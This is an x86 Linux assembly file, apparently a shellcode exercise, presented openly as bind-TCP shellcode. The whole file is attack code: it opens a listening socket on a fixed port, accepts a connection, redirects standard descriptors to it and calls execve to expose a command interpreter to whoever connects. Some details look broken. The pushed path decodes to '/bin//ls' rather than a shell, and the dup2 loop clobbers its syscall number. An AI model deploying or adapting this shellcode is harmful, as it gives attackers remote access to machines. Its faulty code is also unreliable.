; Author: Eduardo Silva
; 
; Shell Bind TCP Shellcode
; 
;

global	_start

section	.text

_start:

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	cdq
	
	; socket syscall

	mov ax, 0x167
	mov bl, 0x2
	mov cl, 0x1
	; edx is already zero
	int 0x80	; interruption syscall or interrupt vector. Returns pointer to the socket in eax

	; bind syscall

	mov ebx, eax 	; moves socket address to ebx (first arg - sockfd)
	xor eax, eax
	push edx	; edx remains zero
	
	; sockaddr struct	
	push edx	; 0.0.0.0
	push word 0x2329 ; little endian here is important 
	push word 0x2
	mov ecx, esp
	
	mov dl, 0x10
	mov ax, 0x169
	int 0x80
	
	; listen syscall

	xor eax, eax
	xor ecx, ecx
	; ebx already has sockfd
	mov ax, 0x16b
	int 0x80

	; accept syscall

	; ebx already has sockfd
	xor edx, edx
	xor ecx, ecx
	xor eax, eax
	mov ax, 0x16c 	
	int 0x80

	; dup2
	mov cl, 0x3
	mov ebx, eax
	xor eax, eax
	mov al, 0x3f
	
dup2:
	int 0x80
	loop dup2	; decrements ecx and jumps until ecx=0

	; execve

	xor eax, eax
	push eax
	push 0x736c2f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 0xb
	int 0x80		


